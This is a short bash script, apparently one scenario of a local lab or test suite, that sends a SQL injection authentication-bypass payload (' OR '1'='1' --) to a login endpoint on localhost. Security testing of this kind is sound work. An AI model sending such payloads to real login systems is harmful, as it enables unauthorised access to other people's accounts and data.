#!/bin/bash
echo "========================================="
echo "Scenario 1 - SQL Injection Auth Bypass"
echo "========================================="
curl -s -X POST http://localhost:5000/login \
    -H "Content-Type: application/json" \
    -d '{
        "username":"'\'' OR '\''1'\''='\''1'\'' -- ",
        "password":"anything"
    }'
echo
echo "[✓] SQLi payload sent."
